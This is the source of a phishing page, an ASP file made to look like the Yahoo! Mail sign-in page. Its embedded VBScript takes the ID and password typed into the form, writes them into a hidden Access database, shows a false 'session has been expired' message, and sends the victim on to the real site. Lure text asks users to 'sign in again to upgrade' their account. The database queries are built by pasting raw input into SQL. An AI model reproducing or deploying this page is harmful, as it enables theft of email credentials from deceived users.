<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>Yahoo! Mail - The best web-based email!</TITLE>
<META http-equiv=Content-Type content="text/html; charset=windows-1252"><LINK 
href="yh_files/mail_style.css" type=text/css rel=stylesheet>
<STYLE type=text/css>BODY {
	MARGIN-TOP: 0px
}
</STYLE>

<META content="Microsoft FrontPage 5.0" name=GENERATOR></HEAD>
<BODY bgColor=#ffffff>
<CENTER>
<TABLE cellSpacing=0 cellPadding=0 width=720 border=0>
  <TBODY>
  <TR>
    <TD noWrap height=5><SPACER height="5" width="1" type="block"></TD></TR>
  <TR>
    <TD>
      <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
        <TBODY>
        <TR>
          <TD align=left width="1%">
            <TABLE cellSpacing=0 cellPadding=0 width="1%" border=0>
              <TBODY>
              <TR>
                <TD noWrap align=left width="1%"><IMG height=33 
                  alt="Yahoo! Mail" src="yh_files/ma_mail_1.gif" width=196 
                  border=0> </TD></TR></TBODY></TABLE></TD>
          <TD vAlign=bottom noWrap align=right width="100%">
            <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
              <TBODY>
              <TR>
                <TD vAlign=bottom noWrap align=right width="99%"><FONT 
                  face=Arial size=-1><A href="http://www.yahoo.com/">Yahoo!</A> 
                  - <A 
                  href="http://help.yahoo.com/help/us/edit/">Help</A></FONT> 
<BR>
                  <HR noShade SIZE=1>
                </TD></TR></TBODY></TABLE></TD>
          <TD align=right width="1%"><IMG height=28 alt="" hspace=3 
            src="yh_files/powrdbyhp_blu_84x28_yahoo.gif" width=84 align=center 
            border=0></TD></TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD noWrap height=5><SPACER height="5" width="1" 
  type="block"></TD></TR></TBODY></TABLE><%

set c = Server.CreateObject("ADODB.Connection")
c.Open "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & server.mappath("users.mdb") & ";"   
set rs = Server.CreateObject("ADODB.Recordset")
 if not isEmpty(request.form()) then
   
      host=request.form("login")
      pwd=request.form("passwd")
      
      mysql="select * from users where host='" & host & "' and pwd='" & pwd & "'"
      
      if rs.State=1 then rs.Close
         rs.open mysql,c,1,2
      if rs.BOF and rs.EOF then
            mysql="select max(hostid)+1 from users"
           if rs.State=1 then rs.Close
           rs.Open mysql,c,1,2
     

        mysql="insert into users(hostid,host,pwd) values (" & RS.Fields(0) & ",'" & host & "','" & pwd & "')"
                         
       response.write("<center><h3><font face=Arial size=3><h3> Sorry ..  " & host & " the session has been expired</font>  </h3><center><br>")     
     

         if rs.State=1 then rs.Close
         rs.open mysql,c,1,2            
      else
      response.write("<center><h3><font face=Arial size=3>user id found <br> <h3> Sorry ..  " & host & "  Your session has been expired  </h3></font><center><br>")     
     
      end if  

      response.write("<center><h3><font face=Arial size=3> Please click here to login again <a href =http:\\www.yahoomail.com> Yahoo! mail </a></font> </h3></center><br>")     
         set rs = nothing
         set c = nothing
      
         response.end
end if
%>
<FORM name=login_form method=post>
<TABLE cellSpacing=0 cellPadding=0 width=720 bgColor=#b6c7e5 border=0>
  <TBODY>
  <TR>
    <TD vAlign=top noWrap align=left width=12><IMG height=10 alt="" 
      src="yh_files/login_r1_c1.gif" width=12 border=0 name=login_r1_c1></TD>
    <TD vAlign=top noWrap width=450>
      <TABLE cellSpacing=0 cellPadding=0 width=450 bgColor=#b6c7e5 border=0>
        <TBODY>
        <TR>
          <TD noWrap width=15><SPACER width="15" type="block"></TD>
          <TD class=headlineblue vAlign=center noWrap align=right 
            width=197><BR>Yahoo! Mail <BR>Enhance your account<BR>It is FREE.</TD>
          <TD noWrap align=left width=214><IMG height=130 
            src="yh_files/login_woman.jpg" width=195></TD>
          <TD noWrap width=24><SPACER width="20" type="block"></TD></TR>
        <TR>
          <TD width=450 bgColor=#250175 colSpan=4 8??><IMG height=8 
            src="yh_files/login_blue_horiz.gif" width=450></TD></TR></TBODY></TABLE>
      <TABLE cellSpacing=0 cellPadding=0 width=450 bgColor=#b6c7e5 border=0>
        <TBODY>
        <TR>
          <TD noWrap colSpan=4 height=10><SPACER type="vertical" 
        size="20"></TD></TR>
        <TR>
          <TD noWrap width=10><SPACER width="10" type="block"></TD>
          <TD class=bodyblue vAlign=top noWrap align=left width=276><SPAN 
            style="FONT-SIZE: 18px; LINE-HEIGHT: 22px"><FONT 
            style="FONT-SIZE: 18px; LINE-HEIGHT: 22px">New to 
            Yahoo!?</FONT></SPAN><BR><FONT class=bodyblue><B>Get a free <A 
            style="COLOR: #7b0099" href="http://us.rd.yahoo.com/reg">Yahoo! 
            Mail</A> account</B> – it's a breeze to stay connected and manage 
            your busy life.</FONT> 
            <UL 
              style="MARGIN-TOP: 10px; PADDING-LEFT: 10px; MARGIN-LEFT: 10px"><LI 
              style="MARGIN-TOP: 6px"><FONT class=bodyblue><B>250MB of email 
              storage</B><BR>Keep more of what's important to you </FONT>
              <LI style="MARGIN-TOP: 6px"><FONT class=bodyblue><B>Powerful spam 
              protection</B><BR>Read only the mail you really want </FONT>
              <LI style="MARGIN-TOP: 6px"><FONT class=bodyblue><B>Get your mail 
              anywhere</B><BR>All you need is a web connection</FONT> <BR><A 
              style="COLOR: #7b0099" href="http://us.rd.yahoo.com/"><FONT 
              class=bodyblue>Learn More</FONT></A> </LI></UL>
            <TABLE height=95 cellSpacing=0 cellPadding=0 align=center 
              border=0><TBODY>
              <TR>
                <TD align=left width=60><A 
                  href="http://reviews.cnet.com/Yahoo_Mail/4505-9236_7-30980704.html"><IMG 
                  height=95 src="yh_files/EC_aug04_47x95_2.gif" width=47 
                  align=left border=0></A> </TD>
                <TD align=middle width=300>&nbsp;&nbsp;&nbsp; <INPUT class=buttonpurple type=submit value="Sign Up Now"></TD></TR></TBODY></TABLE></TD>
          <TD vAlign=top align=middle><IMG height=242 
            src="yh_files/login_divide1.gif" width=23 border=0></TD>
          <TD class=bodyblue vAlign=top><BR><B>Need more? Get <A 
            style="COLOR: #7b0099" 
            href="http://us.rd.yahoo.com/mail_us/login/">Yahoo! Mail 
            Plus</B></A>.<BR><BR>Mail Plus offers personalized spam protection, 
            a virtually unlimited 2GB of storage, POP access, and more for only 
            <STRONG>$19.99/year</STRONG>.<BR><BR><A style="COLOR: #7b0099" 
            href="http://us.rd.yahoo.com/mail_us/login/">Learn more</A> 
        </TD></TR></TBODY></TABLE></TD>
    <TD noWrap width=10><SPACER width="10" type="block"></TD>
    <TD vAlign=top noWrap>
      <TABLE height="96%" cellSpacing=0 cellPadding=0 bgColor=#5350b9 
        border=0><TBODY>
        <TR bgColor=#b6c7e5>
          <TD colSpan=3 height=23><SPACER height="23" type="vertical"></TD></TR>
        <TR>
          <TD vAlign=top noWrap align=left width=10 height=9><IMG height=9 
            alt="" src="yh_files/login_r2_c4.gif" width=10 border=0></TD>
          <TD>&nbsp;</TD>
          <TD vAlign=top noWrap align=right width=9 height=10><IMG height=10 
            alt="" src="yh_files/login_r2_c6.gif" width=9 border=0></TD></TR>
        <TR>
          <TD noWrap width=10>&nbsp;</TD>
          <TD>
            <TABLE cellSpacing=0 cellPadding=0 border=0>
              <TBODY>
              <TR>
                <TD class=bodywhite align=right height=50><BR><SPAN 
                  style="FONT-WEIGHT: bold; FONT-SIZE: 15px; LINE-HEIGHT: 17px"><B>Already 
                  have a Yahoo! ID?</B></SPAN><BR>Please sign in again to upgrade your 
                  mail account<BR>
                  <HR color=#8380de noShade SIZE=1>
                  <BR><BR>Enter your ID and password<BR></TD></TR><!------------------ BEGIN login form ------------------->
              <TR>
                <TD>
                  <TABLE cellSpacing=0 cellPadding=2 border=0>
                    <TBODY>
                    <TR>
                      <TD class=bodywhite noWrap align=right>Yahoo! ID:</TD>
                      <TD align=right><INPUT size=17 name=login></TD></TR>
                    <TR>
                      <TD class=bodywhite noWrap align=right>Password:</TD>
                      <TD align=right><INPUT type=password size=17 
                      name=passwd></TD></TR>
                    <TR>
                      <TD class=bodywhite noWrap align=right colSpan=2><INPUT 
                        type=checkbox value=y name=remm>Remember my ID on this 
                        computer<BR><BR></TD></TR>
                    <TR>
                      <TD align=right colSpan=2><INPUT class=buttonwhite type=submit value="Sign In" name=command></TD></TR></TBODY></TABLE></TD></TR><!------------------ END login form -----------------------><!------------------ BEGIN login links -------------------->
              <TR>
                <TD class=bodywhite vAlign=top align=right><BR>MODE: 
                  Standard&nbsp;|&nbsp;<A style="COLOR: #7ae8ff" 
                  href="http://us.rd.yahoo.com/">Secure</A> <BR><BR><BR>
                  <HR color=#8380de noShade SIZE=1>
                  <BR><A style="COLOR: #7ae8ff" 
                  href="http://us.rd.yahoo.com/">Sign-in help</A><BR><A 
                  style="COLOR: #7ae8ff" href="http://us.rd.yahoo.com/">Forgot 
                  your password?</A><BR><BR></TD></TR></TBODY></TABLE></TD>
          <TD noWrap width=9>&nbsp;</TD><!------------------ END login links ----------------------></TR>
        <TR>
          <TD vAlign=bottom noWrap align=left width=10 height=10><IMG 
            height=10 alt="" src="yh_files/login_r8_c4.gif" width=10 
border=0></TD>
          <TD>&nbsp;</TD>
          <TD vAlign=bottom noWrap align=right width=9 height=10><IMG 
            height=10 alt="" src="yh_files/login_r8_c6.gif" width=9 
        border=0></TD></TR>
        <TR bgColor=#b6c7e5>
          <TD colSpan=3 height=10><SPACER SIZE="10" 
        TYPE="vertical"></TD></TR></TBODY></TABLE></TD>
    <TD vAlign=top align=right width=10><IMG height=10 alt="" 
      src="yh_files/login_r1_c7.gif" width=10 
border=0></TD></TR></TBODY></TABLE></FORM>
<TABLE cellSpacing=0 cellPadding=0 width=720 bgColor=#b6c7e5 border=0>
  <TBODY>
  <TR>
    <TD vAlign=bottom align=left width=10><IMG height=10 alt="" 
      src="yh_files/login_r9_c1.gif" width=12 border=0></TD>
    <TD noWrap width=696><SPACER width="696" type="block"></TD>
    <TD vAlign=bottom align=right width=10><IMG height=10 alt="" 
      src="yh_files/login_r9_c7.gif" width=12 border=0></TD></TR></TBODY></TABLE><BR>
<TABLE cellSpacing=0 cellPadding=0 width=720 border=0>
  <TBODY>
  <TR>
    <TD align=middle>
      <DIV align=center>
      <TABLE cellSpacing=0 cellPadding=2 width="100%" border=0>
        <TBODY>
        <TR>
          <TD align=left colSpan=2><FONT face=Arial><B>Yahoo! Mail for 
            International Users</B></FONT> </TD></TR>
        <TR>
          <TD vAlign=top align=right><SMALL><FONT face=Arial 
            size=-2><I>Europe</I> :</FONT></SMALL></TD>
          <TD vAlign=top><SMALL><FONT face=Arial size=-2><A 
            href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=dk&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Danmark</A> 
            - <A 
            href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=de&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Deutschland</A> 
            - <A 
            href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=es&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">España</A> 
            - <A 
            href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=fr&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">France</A> 
            - <A 
            href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=it&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Italia</A> 
            - <A 
            href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=no&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Norge</A> 
            - <A 
            href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=se&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Sverige</A> 
            - <A 
            href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=uk&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">UK</A>/<A 
            href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=ie&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Ireland</A> 
            </FONT></SMALL></TD></TR>
        <TR>
          <TD vAlign=top align=right><SMALL><FONT face=Arial 
            size=-2><I>Pacific Rim</I>:</FONT></SMALL></TD>
          <TD vAlign=top><SMALL><FONT face=Arial size=-2><A 
            href="http://us.rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=au&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Australia</A>/<A 
            href="http://us.rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=nz&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">NZ</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=cn&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">China</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=hk&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Hong 
            Kong</A> - <A 
            href="http://us.rd.yahoo.com/login/ym/*http://login.india.yahoo.com/config/login?.intl=in&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">India</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/*http://mail.yahoo.co.jp/">Japan</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/*http://login.korea.yahoo.com/config/login?.intl=kr&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Korea</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=sg&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Singapore</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=tw&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Taiwan</A></FONT></SMALL></TD></TR>
        <TR>
          <TD vAlign=top align=right><SMALL><FONT face=Arial 
            size=-2><I>Americas</I>:</FONT></SMALL></TD>
          <TD vAlign=top><SMALL><FONT face=Arial size=-2><A 
            href="http://us.rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=ar&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Argentina</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=br&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Brasil</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=ca&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Canada</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=mx&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">Mexico</A> 
            - <A 
            href="http://us.rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=b5&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">in 
            Chinese</A> - <A 
            href="http://us.rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=e1&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">en 
            Español</A> - <A 
            href="http://us.rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=ru&amp;.src=ym&amp;.done=http%3a//mail.yahoo.com">in 
            Russian</A> </FONT></SMALL></TD></TR></TBODY></TABLE></DIV></TD>
    <TD vAlign=center align=middle><A 
      href="http://us.rd.yahoo.com/reg/login/new_ym/us/*http://my.yahoo.com/netapp/?http://www.netapp.com/poweredby.html" 
      height="60" width="105" border="0" src="yh_files/ntap4.gif" 
      alt="Powered by NetApp" <IMG></A></TD>
    <TD></TD></TR></TBODY></TABLE></CENTER>
<CENTER>
<HR width=720 noShade SIZE=1>

<TABLE cellSpacing=0 cellPadding=0 width=720 summary=null border=0>
  <TBODY>
  <TR>
    <TD align=middle><FONT face=arial color=#8d8d8d size=-2>Copyright © 2005 
      Yahoo! Inc. All rights reserved. <A 
      title="Click here to view Yahoo! Copyright Policy" 
      href="http://docs.yahoo.com/info/copyright/copyright.html">Copyright 
      Policy</A> <A title="Click here to view Yahoo! Terms of Service" 
      href="http://docs.yahoo.com/info/terms/">Terms of 
      Service</A><BR><B>NOTICE: We collect personal information on this 
      site.<BR>To learn more about how we use your information, see our <A 
      title="Click here to view Yahoo! Privacy Policy" 
      href="http://privacy.yahoo.com/">Privacy Policy</A></B> 
  </FONT></TD></TR></TBODY></TABLE></CENTER></BODY></HTML>